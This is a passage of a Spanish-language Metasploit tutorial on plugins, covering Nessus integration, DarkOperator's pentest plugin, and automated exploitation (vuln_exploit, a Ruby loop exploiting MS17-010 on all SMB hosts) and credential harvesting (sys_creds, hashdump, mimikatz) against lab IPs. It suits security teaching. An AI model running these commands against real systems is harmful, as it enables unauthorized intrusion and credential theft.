# Sección 8: Plugins en Metasploit

## 📋 Tabla de Contenidos

1. [¿Qué son los Plugins?](#qué-son-los-plugins)
2. [¿Por Qué Usar Plugins?](#por-qué-usar-plugins)
3. [Ubicación de Plugins](#ubicación-de-plugins)
4. [Usar Plugins](#usar-plugins)
5. [Instalar Nuevos Plugins](#instalar-nuevos-plugins)
6. [Plugins Populares](#plugins-populares)
7. [Mixins en Ruby](#mixins-en-ruby)

---

## 🎯 ¿Qué son los Plugins?

### Definición Técnica

> Los **Plugins** son software fácilmente disponible que ya ha sido lanzado por terceros y han dado aprobación a los creadores de Metasploit para integrar su software dentro del framework.

Pero esa definición es muy seca. Vamos a entender **realmente** qué son los plugins.

### Analogía: El Smartphone y sus Apps

Imagina que Metasploit es como tu **smartphone**:

```
┌─────────────────────────────────────────────┐
│         METASPLOIT = SMARTPHONE             │
└─────────────────────────────────────────────┘

SISTEMA OPERATIVO BASE:
┌──────────────────┐
│  iOS / Android   │ = Metasploit Framework
│  (Funcionalidad  │   (Exploits, Payloads, Encoders)
│   básica)        │
└──────────────────┘

VIENE CON APPS BÁSICAS:
- 📞 Teléfono        = Módulos de exploit
- 📧 Email           = Módulos auxiliares
- 📷 Cámara          = Módulos de payload
- 🌐 Safari/Chrome   = msfconsole

PERO EL VERDADERO PODER VIENE DE:
- 📱 Instagram       = Plugin de Nessus
- 🎵 Spotify         = Plugin de Nmap
- 💬 WhatsApp        = Plugin de Mimikatz
- 🎮 Juegos          = Plugin de OpenVAS
```

**Los plugins son como las "apps" que instalas en tu teléfono**:
- El teléfono funciona sin ellas
- Pero con ellas, puedes hacer MUCHO más
- Cada app tiene un propósito específico
- Puedes instalar las que necesites

### Tipos de Plugins

Los plugins pueden ser:

#### 1. Productos Comerciales con Versión Community

**Ejemplos**:
- **Nessus** (Tenable)
- **Nexpose** (Rapid7)
- **OpenVAS** (Greenbone)

```
PRODUCTO COMERCIAL:
┌─────────────────────────────────┐
│  Nessus Professional            │
│  Precio: $3,000+/año            │
│  Funcionalidad: Completa        │
└─────────────────────────────────┘

VERSIÓN COMMUNITY (Plugin en MSF):
┌─────────────────────────────────┐
│  Nessus Community Edition       │
│  Precio: GRATIS                 │
│  Funcionalidad: Limitada        │
│  Integración: Dentro de msfconsole │
└─────────────────────────────────┘
```

**Ventaja**: Usas software profesional de forma gratuita (con limitaciones), integrado directamente en Metasploit.

**Analogía**: Es como tener Spotify Free vs Spotify Premium. La versión Free (Community) tiene anuncios y limitaciones, pero sigue siendo útil y está integrada en tu teléfono.

#### 2. Proyectos Individuales de Desarrolladores

**Ejemplos**:
- **Pentest Plugin** (Carlos Perez / DarkOperator)
- **Auto Add Route** (Community)
- **Session Notifier** (Community)

```
DESARROLLADOR INDIVIDUAL:
┌─────────────────────────────────┐
│  Carlos Perez (DarkOperator)    │
│  Piensa: "Hago esto manualmente │
│           todo el tiempo..."     │
│  Crea: Plugin que lo automatiza │
│  Comparte: Gratis en GitHub     │
└─────────────────────────────────┘

BENEFICIO PARA TI:
┌─────────────────────────────────┐
│  Instalas el plugin             │
│  Ahorras horas de trabajo       │
│  Automatizas tareas repetitivas │
└─────────────────────────────────┘
```

**Analogía**: Es como cuando un desarrollador crea una app gratuita que resuelve un problema que muchos tienen. Tú te beneficias de su trabajo sin pagar nada.

### ¿Qué NO son los Plugins?

Para entender mejor, veamos qué NO son:

| SON Plugins | NO SON Plugins |
|-------------|----------------|
| Software de terceros integrado | Módulos nativos de Metasploit |
| Pueden ser comerciales o gratis | Siempre vienen con MSF |
| Se instalan opcionalmente | Ya están instalados |
| Añaden funcionalidad externa | Funcionalidad core del framework |
| Ejemplos: Nessus, Nmap, Mimikatz | Ejemplos: ms17_010, meterpreter |

**Diferencia Clave**:

```
MÓDULO (Parte de Metasploit):
  exploit/windows/smb/ms17_010_eternalblue
  └─ Viene con Metasploit
  └─ Desarrollado por Rapid7/Metasploit team
  └─ NO necesitas instalar nada extra

PLUGIN (Software externo):
  Nessus vulnerability scanner
  └─ Software de Tenable (empresa externa)
  └─ Integración creada para trabajar con MSF
  └─ Necesitas cargar el plugin: load nessus
```

---

## 🚀 ¿Por Qué Usar Plugins?

### El Problema SIN Plugins

**Workflow Antiguo** (pre-plugins, circa 2008):

```
FASE 1: RECONNAISSANCE
┌──────────────────────┐
│ 1. Abrir Nmap        │
│ 2. Hacer port scan   │
│ 3. Guardar output    │
│    nmap.xml          │
└──────────────────────┘
         ↓
FASE 2: VULNERABILITY SCANNING
┌──────────────────────┐
│ 1. Abrir Nessus      │
│ 2. Importar hosts    │
│    desde nmap.xml    │
│ 3. Configurar scan   │
│ 4. Ejecutar scan     │
│ 5. Exportar reporte  │
│    nessus.xml        │
└──────────────────────┘
         ↓
FASE 3: EXPLOITATION
┌──────────────────────┐
│ 1. Abrir Metasploit  │
│ 2. Leer nessus.xml   │
│    manualmente       │
│ 3. Anotar vulns      │
│ 4. Configurar exploit│
│    set RHOST ...     │
│    set RPORT ...     │
│ 5. Exploit           │
└──────────────────────┘
         ↓
FASE 4: POST-EXPLOITATION
┌──────────────────────┐
│ 1. Abrir Excel       │
│ 2. Copiar/pegar      │
│    resultados        │
│ 3. Formatear reporte │
│ 4. Repetir para cada │
│    host              │
└──────────────────────┘

TIEMPO TOTAL: 8+ horas
CAMBIOS DE CONTEXTO: 15+
ERRORES DE COPY/PASTE: Muchos
DOCUMENTACIÓN: Manual y propensa a errores
```

**Problemas**:

1. ❌ **Cambio constante de herramientas** (Nmap → Nessus → MSF → Excel)
2. ❌ **Repetir configuración** una y otra vez
3. ❌ **Copiar/pegar manualmente** (propenso a errores)
4. ❌ **Sin documentación automática**
5. ❌ **Pérdida de contexto** entre herramientas



### La Solución CON Plugins

**Workflow Moderno** (con plugins, 2025):



TODAS LAS FASES EN MSFCONSOLE:

```text
┌──────────────────────────────────────────┐
│  msfconsole (TODO AQUÍ ADENTRO)          │
├──────────────────────────────────────────┤
│                                          │
│  msf6 > db_nmap -sV 192.168.1.0/24      │
│  [*] Nmap scan running...                │
│  [*] Importing to database...            │
│  [+] 50 hosts discovered                 │
│                                          │
│  msf6 > load nessus                      │
│  msf6 > nessus_scan_new 1 "Quick" targets│
│  [*] Scanning...                         │
│  [*] Auto-importing to database...       │
│  [+] 23 vulnerabilities found            │
│                                          │
│  msf6 > vulns                            │
│  [*] Showing vulnerabilities:            │
│    - MS17-010 on 192.168.1.10            │
│    - Tomcat default creds on .20         │
│                                          │
│  msf6 > use exploit/windows/smb/ms17_010 │
│  msf6 > set RHOSTS 192.168.1.10          │
│  msf6 > exploit                          │
│  [*] Meterpreter session 1 opened        │
│                                          │
│  [TODO DOCUMENTADO AUTOMÁTICAMENTE]      │
│  [HOSTS, SERVICES, VULNS EN LA BD]       │
│  [LISTO PARA GENERAR REPORTE]            │
└──────────────────────────────────────────┘

```

TIEMPO TOTAL: 2 horas
CAMBIOS DE CONTEXTO: 0 (todo en msfconsole)
ERRORES: Minimizados (automatización)
DOCUMENTACIÓN: Automática en base de datos


**Ventajas**:

✅ **Todo en un solo lugar** (msfconsole)  
✅ **Configuración automática** (los plugins hablan entre sí)  
✅ **Documentación automática** (todo va a la base de datos)  
✅ **Hosts, servicios y vulnerabilidades** at-a-glance  
✅ **Menos errores** (automatización vs. manual)  



WORKFLOW AUTOMÁTICO:

db_nmap -sV target.com
  ↓
[Auto-import a database]
  ↓
hosts → Muestra hosts descubiertos
services → Muestra servicios detectados
  ↓
load nessus
nessus_scan_new
  ↓
[Auto-import vulnerabilities]
  ↓
vulns → Muestra vulns encontradas
  ↓
[TODO EN LA MISMA BASE DE DATOS]
```

**Antes**: Exportar XML → Importar XML → Parsear manualmente  
**Ahora**: Automático, todo en la misma base de datos PostgreSQL

#### 3. Configuración y Parámetros Compartidos

```
EJEMPLO:

hosts → Muestra: 192.168.1.10 (Windows Server 2012)

use exploit/windows/smb/ms17_010_eternalblue
  ↓
[MSF YA SABE el target por la DB]
  ↓
set RHOSTS 192.168.1.10  ← Auto-completado disponible
  ↓
[No necesitas copiar/pegar, está en la DB]
```

#### 4. Documentación Automática

> "Everything is automatically documented by msfconsole into the database we are using"

```
AUTOMÁTICAMENTE SE REGISTRA:

┌─────────────────────────────────────┐
│  PostgreSQL Database                │
├─────────────────────────────────────┤
│  Tabla: hosts                       │
│  - 192.168.1.10 (Windows Server)    │
│  - 192.168.1.20 (Ubuntu 20.04)      │
│                                     │
│  Tabla: services                    │
│  - 192.168.1.10:445 (SMB)           │
│  - 192.168.1.20:22 (SSH)            │
│                                     │
│  Tabla: vulns                       │
│  - MS17-010 on .10                  │
│  - Weak SSH creds on .20            │
│                                     │
│  Tabla: sessions                    │
│  - Session 1: Meterpreter on .10    │
│                                     │
│  Tabla: loot                        │
│  - NTLM hashes from .10             │
│  - /etc/shadow from .20             │
└─────────────────────────────────────┘

TODO ESTO SE REGISTRA AUTOMÁTICAMENTE
```

**Resultado**: Al final del pentest, tienes **toda la información** organizada y lista para generar reportes.

#### 5. Visión At-a-Glance

```
msf6 > hosts

Hosts
=====

address        mac                name  os_name       purpose  info  comments
-------        ---                ----  -------       -------  ----  --------
192.168.1.10   00:0c:29:68:51:bb        Windows 2012  server         
192.168.1.20   00:0c:29:68:51:cc        Ubuntu 20.04  server         

msf6 > vulns

Vulnerabilities
===============

Timestamp   Host           Name       References
---------   ----           ----       ----------
2025-01-15  192.168.1.10   MS17-010   CVE-2017-0144, MSB-MS17-010
2025-01-15  192.168.1.20   SSH-WEAK   CVE-2018-XXXX
```

**At-a-glance** = De un vistazo, ves:
- Todos tus hosts
- Todos los servicios
- Todas las vulnerabilidades
- Todas tus sesiones activas

**No necesitas buscar en archivos XML o recordar qué encontraste** - está todo ahí, organizado.

### Funcionalidad Adicional de los Plugins

> "Plugins work directly with the API and can be used to manipulate the entire framework."

Los plugins no son simples "add-ons" - tienen **acceso completo** al framework.

**Qué pueden hacer**:

#### 1. Automatizar Tareas Repetitivas

```ruby
# Ejemplo conceptual de un plugin
def auto_exploit_smb
  # Busca todos los hosts con SMB
  hosts_with_smb = framework.db.hosts.where(service: 'smb')
  
  hosts_with_smb.each do |host|
    # Auto-configura el exploit
    exploit = framework.exploits['windows/smb/ms17_010_eternalblue']
    exploit.datastore['RHOSTS'] = host.address
    
    # Auto-ejecuta
    exploit.exploit_simple(
      'Payload' => 'windows/x64/meterpreter/reverse_tcp',
      'LHOST' => '10.10.14.5'
    )
  end
end
```

**Sin plugin**: Tendrías que hacer esto manualmente para cada host.  
**Con plugin**: Un comando, explota todos automáticamente.

#### 2. Agregar Nuevos Comandos a msfconsole

```
ANTES DE CARGAR PLUGIN:
msf6 > nessus_scan
[-] Unknown command: nessus_scan

DESPUÉS DE CARGAR PLUGIN:
msf6 > load nessus
[*] Nessus plugin loaded

msf6 > nessus_scan
[*] Starting Nessus scan...

¡NUEVO COMANDO DISPONIBLE!
```

#### 3. Extender el Framework Completo

```
PLUGIN AVANZADO puede:
  - Crear nuevos tipos de sesiones
  - Integrar con APIs externas
  - Modificar el flujo de trabajo
  - Agregar nuevas categorías de módulos
  - Personalizar la salida de reportes
```

**Ejemplo Real**: El plugin **Armitage** convirtió Metasploit de CLI a GUI completo.

---

## 📂 Ubicación de Plugins

### Directorio por Defecto

```bash
/usr/share/metasploit-framework/plugins
```

Este es el directorio **estándar** donde Metasploit busca plugins en cada instalación nueva.

**Analogía**: Es como la carpeta `/Applications` en Mac o `C:\Program Files` en Windows - el lugar donde "viven" las aplicaciones instaladas.

### Ver Plugins Disponibles

```bash
$ ls /usr/share/metasploit-framework/plugins

aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```

**Todos estos archivos `.rb`** son plugins disponibles para usar.

### Anatomía de un Plugin

Cada plugin es un archivo **Ruby** (`.rb`) que contiene:

```ruby
# Ejemplo simplificado de estructura de plugin

module Msf
  class Plugin::MiPlugin < Msf::Plugin
    
    # Descripción del plugin
    def name
      "Mi Plugin Ejemplo"
    end
    
    # Descripción de qué hace
    def desc
      "Este plugin hace cosas increíbles"
    end
    
    # Inicialización (se ejecuta al cargar)
    def initialize(framework, opts)
      super
      add_console_dispatcher(MiPluginCommandDispatcher)
      print_status("Mi Plugin cargado exitosamente")
    end
    
    # Limpieza (se ejecuta al descargar)
    def cleanup
      remove_console_dispatcher('MiPlugin')
    end
    
    # Los comandos que agrega
    class MiPluginCommandDispatcher
      def cmd_mi_comando(*args)
        print_status("¡Ejecutando mi comando!")
      end
    end
  end
end
```

**No necesitas saber Ruby** para usar plugins, pero si quieres **crear tus propios plugins**, este es el template básico.

### Tipos de Archivos en el Directorio

```
PLUGINS PRE-INSTALADOS:
├─ nessus.rb           ← Scanner de vulnerabilidades Nessus
├─ nexpose.rb          ← Scanner de vulnerabilidades Nexpose
├─ openvas.rb          ← Scanner de vulnerabilidades OpenVAS
├─ wmap.rb             ← Web application mapper
├─ sqlmap.rb           ← SQL injection tool integration
└─ ... (más)

PLUGINS DE AUTOMATIZACIÓN:
├─ auto_add_route.rb   ← Auto-agrega rutas en pivoting
├─ alias.rb            ← Crea aliases de comandos
├─ db_tracker.rb       ← Tracking de database changes
└─ session_notifier.rb ← Notificaciones cuando abres sesión

PLUGINS DE UTILIDAD:
├─ sounds.rb           ← Sonidos al completar tareas
├─ libnotify.rb        ← Notificaciones desktop
├─ pcap_log.rb         ← Log de tráfico en PCAP
└─ token_hunter.rb     ← Busca tokens de Windows
```

---

## 🔧 Usar Plugins

### Verificar que el Plugin Existe

**Paso 1**: Listar plugins disponibles

```bash
$ ls /usr/share/metasploit-framework/plugins | grep nessus
nessus.rb
```

✅ El archivo `nessus.rb` existe → El plugin está disponible.

### Cargar un Plugin en msfconsole

**Paso 2**: Dentro de msfconsole, usar `load`

```bash
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus
```

**Desglose de lo que pasó**:

```
ANTES de load nessus:
┌────────────────────────────┐
│  msfconsole                │
│  - Comandos básicos        │
│  - Exploits, payloads      │
│  - Base de datos           │
│  - NO comandos de Nessus   │
└────────────────────────────┘

load nessus ejecuta:
  1. Lee /usr/share/metasploit-framework/plugins/nessus.rb
  2. Ejecuta el código de inicialización
  3. Registra nuevos comandos (nessus_*)
  4. Conecta con la API de Nessus
  5. Muestra mensaje de éxito

DESPUÉS de load nessus:
┌────────────────────────────┐
│  msfconsole                │
│  - Comandos básicos        │
│  - Exploits, payloads      │
│  - Base de datos           │
│  + nessus_connect          │
│  + nessus_scan             │
│  + nessus_report           │
│  + ... (más comandos)      │
└────────────────────────────┘
```

### Ver Comandos Disponibles del Plugin

**Paso 3**: Usar el comando de ayuda del plugin

```bash
msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all policies
nessus_policy_del           Delete a policy
```

**Categorías de Comandos**:

#### Generic Commands (Comandos Genéricos)

```
nessus_connect      → Conectar al servidor Nessus
nessus_login        → Login con credenciales
nessus_logout       → Cerrar sesión
```

**Uso típico**:
```bash
msf6 > nessus_connect localhost:8834 admin password123
[*] Connecting to https://localhost:8834/
[+] Authenticated successfully
```

#### Policy Commands (Comandos de Políticas)

```
nessus_policy_list  → Ver políticas de scan disponibles
nessus_policy_del   → Borrar una política
```

**¿Qué es una política?**

Una política define **qué** escanea Nessus:
- Puertos a escanear
- Plugins a usar
- Profundidad del scan
- Timing y performance

**Ejemplo**:
```bash
msf6 > nessus_policy_list

Nessus Policies
===============

Policy ID  Name                Description
---------  ----                -----------
1          Basic Network Scan  Port scan + basic vulns
2          Web Application     OWASP Top 10 + web vulns
3          Full Audit          Everything (lento)
```

#### Scan Commands (No mostrados, pero existen)

```
nessus_scan_new     → Crear nuevo scan
nessus_scan_start   → Iniciar un scan
nessus_scan_pause   → Pausar scan en progreso
nessus_scan_status  → Ver estado del scan
```

### Workflow Completo con Plugin de Nessus

```bash
# 1. Cargar plugin
msf6 > load nessus

# 2. Conectar a servidor Nessus
msf6 > nessus_connect localhost:8834 admin mypassword
[+] Authenticated

# 3. Listar políticas disponibles
msf6 > nessus_policy_list
[*] Policy ID 1: Basic Network Scan

# 4. Crear nuevo scan
msf6 > nessus_scan_new 1 "My Pentest" 192.168.1.0/24
[*] Scan created with ID 42

# 5. Iniciar scan
msf6 > nessus_scan_start 42
[*] Scan 42 started

# 6. Esperar... (puede tomar minutos/horas)

# 7. Ver resultados
msf6 > nessus_report_vulns 42
[*] Importing vulnerabilities to database...
[+] 23 vulnerabilities imported

# 8. Ver vulnerabilidades en MSF database
msf6 > vulns

Vulnerabilities
===============

Timestamp   Host           Name       Refs
---------   ----           ----       ----
2025-01-15  192.168.1.10   MS17-010   CVE-2017-0144
2025-01-15  192.168.1.20   SSH-WEAK   CVE-2018-15473

# 9. Ahora puedes usar estas vulns para explotar
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.10  ← Ya sabes cuál host es vulnerable
```

**Flujo Visual**:

```
msfconsole
    ↓
load nessus
    ↓
nessus_connect + login
    ↓
nessus_scan_new (config)
    ↓
nessus_scan_start
    ↓
[Nessus escanea el network]
    ↓
nessus_report_vulns
    ↓
[Auto-import a MSF database]
    ↓
vulns (ver en MSF)
    ↓
use exploit/...
    ↓
PROFIT!
```

### Descargar un Plugin

```bash
msf6 > unload nessus
[*] Nessus plugin unloaded
```

**Cuándo descargar**:
- Ya terminaste de usar el plugin
- Quieres limpiar el namespace de comandos
- Hay conflictos con otro plugin

---

## 📥 Instalar Nuevos Plugins

### Plugins Oficiales (Pre-instalados)

Algunos plugins vienen **pre-instalados** con cada actualización de Kali/Parrot:

```bash
# Actualizar sistema
$ sudo apt update && sudo apt upgrade

# Metasploit se actualiza automáticamente
# Nuevos plugins populares se agregan al directorio /plugins
```

**Analogía**: Es como las actualizaciones de iOS/Android que a veces traen nuevas apps pre-instaladas.

### Plugins Custom (Instalación Manual)

Para plugins **NO incluidos** en las actualizaciones oficiales, hay que instalarlos manualmente.

#### Ejemplo: DarkOperator's Metasploit-Plugins

**DarkOperator** (Carlos Perez) es un investigador de seguridad muy respetado que mantiene plugins útiles.

**Paso 1**: Clonar el repositorio

```bash
$ git clone https://github.com/darkoperator/Metasploit-Plugins

Cloning into 'Metasploit-Plugins'...
remote: Enumerating objects: 245, done.
remote: Total 245 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (245/245), done.
```

**Paso 2**: Ver qué plugins hay disponibles

```bash
$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

**Plugin Interesante**: `pentest.rb`

Este plugin agrega comandos específicos para pentesting que automatizan workflow comunes.

**Paso 3**: Copiar el plugin al directorio de Metasploit

```bash
$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

**Desglose**:
- `sudo` = Necesitas permisos de root (el directorio `/usr/share` es protegido)
- `cp` = Copy (copiar)
- `./Metasploit-Plugins/pentest.rb` = Origen (el archivo que descargaste)
- `/usr/share/metasploit-framework/plugins/pentest.rb` = Destino (donde MSF busca plugins)

**Paso 4**: Verificar permisos

```bash
$ ls -la /usr/share/metasploit-framework/plugins/pentest.rb

-rw-r--r-- 1 root root 45678 Jan 15 10:30 pentest.rb
```

**Permisos correctos**:
- `-rw-r--r--` = Lectura para todos (necesario para que msfconsole pueda leerlo)
- `root root` = Dueño root (normal para archivos en `/usr/share`)

**Si los permisos están mal**:
```bash
$ sudo chmod 644 /usr/share/metasploit-framework/plugins/pentest.rb
```

**Paso 5**: Cargar el plugin en msfconsole

```bash
$ msfconsole -q

msf6 > load pentest

       ___         _          _     ___ _           _
      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _
      |  _/ -_) ' \  _/ -_|_-<  _| |  _/ | || / _` | | ' \ 
      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|
                                              |___/
      
Version 1.6
Pentest Plugin loaded.
by Carlos Perez (carlos_perez[at]darkoperator.com)
[*] Successfully loaded plugin: pentest
```

**¡Banner personalizado!** Muchos plugins tienen su propio "splash screen" ASCII art.

**Paso 6**: Ver nuevos comandos disponibles

```bash
msf6 > help

Tradecraft Commands
===================

    Command          Description
    -------          -----------
    check_footprint  Checks the possible footprint of a post module on a target system.


auto_exploit Commands
=====================

    Command           Description
    -------           -----------
    show_client_side  Show matched client side exploits from data imported from vuln scanners.
    vuln_exploit      Runs exploits based on data imported from vuln scanners.


Discovery Commands
==================

    Command                 Description
    -------                 -----------
    discover_db             Run discovery modules against current hosts in the database.
    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.
    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.
    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.


Project Commands
================

    Command       Description
    -------       -----------
    project       Command for managing projects.


Postauto Commands
=================

    Command             Description
    -------             -----------
    app_creds           Run application password collection modules against specified sessions.
    get_lhost           List local IP addresses that can be used for LHOST.
    multi_cmd           Run shell command against several sessions
    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.
    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.
    multi_post          Run a post module against specified sessions.
    multi_post_rc       Run resource file with post modules and options against specified sessions.
    sys_creds           Run system password collection modules against specified sessions.
```

**¡Wow! Muchos comandos nuevos** organizados por categorías.

### Entendiendo los Nuevos Comandos

Vamos a analizar algunos comandos útiles del plugin **pentest**:

#### 1. Tradecraft Commands

```bash
check_footprint
```

**¿Qué hace?**: Verifica qué "huella" dejará un módulo de post-explotación en el sistema target.

**Por qué es útil**:

```
ESCENARIO:
  Tienes acceso a un servidor
  Quieres ejecutar post module para extraer contraseñas
  PERO no sabes qué tan "ruidoso" es

check_footprint te dice:
  - ¿Deja archivos en disco?
  - ¿Modifica registry?
  - ¿Crea procesos visibles?
  - ¿Genera logs?
  
Entonces decides:
  - Si es silencioso → Lo ejecutas
  - Si es ruidoso → Buscas alternativa
```

**Analogía**: Es como preguntarle a un ladrón experimentado: "Si robo este banco, ¿cuántas cámaras me grabarán?"

#### 2. auto_exploit Commands

```bash
vuln_exploit
```

**¿Qué hace?**: Ejecuta exploits **automáticamente** basándose en vulnerabilidades encontradas por scanners (Nessus, Nexpose).

**Workflow**:

```
1. Ejecutas Nessus scan
   └─> Encuentra: MS17-010 en 192.168.1.10

2. Nessus importa vulns a MSF database
   └─> vuln table tiene: MS17-010, host: .10

3. Ejecutas: vuln_exploit
   └─> Plugin busca en database
   └─> Encuentra MS17-010
   └─> Auto-selecciona exploit/windows/smb/ms17_010_eternalblue
   └─> Auto-configura RHOSTS=192.168.1.10
   └─> Auto-ejecuta exploit
   └─> ¡Session opened!

TODO AUTOMÁTICO
```

**Sin este comando**:
1. Lees manualmente el reporte de Nessus
2. Anotas cada vulnerabilidad
3. Buscas el exploit correspondiente en MSF
4. Configuras manualmente RHOSTS, RPORT, etc.
5. Ejecutas
6. Repites para cada vulnerabilidad

**Con este comando**:
```bash
msf6 > vuln_exploit
[*] Exploiting MS17-010 on 192.168.1.10...
[+] Session 1 opened
[*] Exploiting Tomcat on 192.168.1.20...
[+] Session 2 opened
[*] Done. 2 sessions opened.
```

**Advertencia**: Esto es **muy automatizado**. Úsalo solo en entornos de prueba donde tienes permiso explícito. En pentests reales, siempre **revisa manualmente** antes de ejecutar exploits.

#### 3. Discovery Commands

```bash
network_discover
pivot_network_discover
```

**network_discover**: Escanea redes NO pivotables (redes directamente accesibles)

```bash
msf6 > network_discover 192.168.1.0/24
[*] Running port scan...
[*] Running service detection...
[*] Running OS detection...
[+] Discovered 15 hosts
[+] Results imported to database
```

**pivot_network_discover**: Escanea redes accesibles **a través de** una sesión Meterpreter

```bash
# Tienes Meterpreter session en 192.168.1.10
# Ese host tiene acceso a red interna 10.10.10.0/24
# Tú NO tienes acceso directo a 10.10.10.0/24

msf6 > pivot_network_discover -s 1 10.10.10.0/24
[*] Using session 1 for pivoting...
[*] Scanning 10.10.10.0/24 through pivot...
[+] Discovered 8 hosts in internal network
[+] Results imported to database
```

**Diferencia**:

```
DIRECT SCAN (network_discover):
  Tu PC ───────> Target Network
           (conexión directa)

PIVOT SCAN (pivot_network_discover):
  Tu PC ───> Compromised Host ───> Internal Network
          (pivot a través de host comprometido)
```

#### 4. Postauto Commands

```bash
sys_creds
app_creds
multi_post
```

**sys_creds**: Ejecuta **automáticamente** módulos de recolección de credenciales del sistema en sesiones activas.

```bash
msf6 > sessions

Active sessions
===============

  Id  Name  Type            Information
  --  ----  ----            -----------
  1         meterpreter     DESKTOP-ABC\admin @ DESKTOP-ABC
  2         meterpreter     SRV-WEB\wwwdata @ SRV-WEB

msf6 > sys_creds -s 1,2
[*] Running hashdump on session 1...
[+] admin:1001:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Running mimikatz on session 1...
[+] Plaintext password: P@ssw0rd123
[*] Running hashdump on session 2...
[+] root:0:$6$xyz...:...
[*] All credentials saved to database
```

**Sin este comando**: Tendrías que ejecutar manualmente `hashdump`, `mimikatz`, etc. en cada sesión.

**Con este comando**: Un comando, todas las credenciales de todas las sesiones.

#### 5. Project Commands

```bash
project
```

**¿Qué hace?**: Gestiona "proyectos" (workspaces) en MSF.

**Uso**:

```bash
# Crear proyecto para cliente "Acme Corp"
msf6 > project -a acme_corp

# Cambiar a ese proyecto
msf6 > project -u acme_corp
[*] Switched to project: acme_corp

# Ahora todo lo que hagas se guarda en ese proyecto:
# - Hosts discovered
# - Vulnerabilities
# - Sessions
# - Loot
# - Todo separado de otros proyectos

# Listar proyectos
msf6 > project -l
  acme_corp
  globex_inc
  initech
```

**Ventaja**: Mantén datos de diferentes clientes **completamente separados**.

**Analogía**: Es como tener carpetas separadas para cada cliente en tu computadora.

---

## 🔌 Plugins Populares

> "Many people write many different plugins for the Metasploit framework. They all have a specific purpose and can be an excellent help to save time after familiarizing ourselves with them."

### Tabla de Plugins Populares

| Plugin | Pre-instalado | Función | Cuándo Usar |
|--------|---------------|---------|-------------|
| **nMap** | ✅ Sí | Port scanning integrado | Descubrimiento inicial de hosts |
| **Nessus** | ✅ Sí | Vulnerability scanning | Encontrar vulnerabilidades conocidas |
| **NexPose** | ✅ Sí | Vulnerability scanning (Rapid7) | Alternativa a Nessus |
| **OpenVAS** | ✅ Sí | Vulnerability scanning (open-source) | Alternativa gratuita a Nessus |
| **Mimikatz** | ✅ Sí (v1) | Extracción de credenciales Windows | Post-exploitation en Windows |
| **Stdapi** | ✅ Sí | Standard API para Meterpreter | Post-exploitation estándar |
| **Priv** | ⚠️ Depende | Escalación de privilegios | Cuando necesitas root/SYSTEM |
| **Incognito** | ✅ Sí | Token impersonation en Windows | Robar tokens de otros usuarios |
| **Railgun** | ⚠️ Depende | Llamadas directas a Windows API | Post-exploitation avanzado |
| **DarkOperator's** | ❌ No | Automatización de pentesting | Workflow automatizado |

### Explicación Detallada de Plugins Clave

#### 1. nMap Plugin

**¿Qué hace?**: Integra Nmap (el escáner de puertos más famoso) dentro de msfconsole.

**Comandos**:
```bash
msf6 > db_nmap -sS -sV -O 192.168.1.0/24
```

**Ventajas**:
- ✅ Resultados auto-importados a database
- ✅ No necesitas salir de msfconsole
- ✅ Todos los flags de Nmap disponibles

**Ejemplo Completo**:

```bash
msf6 > db_nmap -sS -sV 192.168.1.10

[*] Nmap: Starting Nmap 7.94 ( https://nmap.org )
[*] Nmap: Nmap scan report for 192.168.1.10
[*] Nmap: Host is up (0.0010s latency).
[*] Nmap: PORT    STATE SERVICE      VERSION
[*] Nmap: 22/tcp  open  ssh          OpenSSH 7.9p1
[*] Nmap: 80/tcp  open  http         Apache httpd 2.4.41
[*] Nmap: 445/tcp open  microsoft-ds Samba smbd 4.9.5

msf6 > services

Services
========

host           port  proto  name          state  info
----           ----  -----  ----          -----  ----
192.168.1.10   22    tcp    ssh           open   OpenSSH 7.9p1
192.168.1.10   80    tcp    http          open   Apache httpd 2.4.41
192.168.1.10   445   tcp    microsoft-ds  open   Samba smbd 4.9.5
```

**Todo ya está en la database** - listo para usar.

#### 2. Nessus Plugin

Ya lo vimos arriba - scanner de vulnerabilidades profesional.

**Flujo Típico**:
```
load nessus
  ↓
nessus_connect
  ↓
nessus_scan_new
  ↓
nessus_scan_start
  ↓
[wait for scan to complete]
  ↓
nessus_report_vulns
  ↓
[vulnerabilities auto-imported]
  ↓
use exploit based on vulns
```

#### 3. Mimikatz Plugin (v1)

**¿Qué hace?**: Extrae credenciales de Windows (contraseñas en texto plano, hashes, tickets Kerberos).

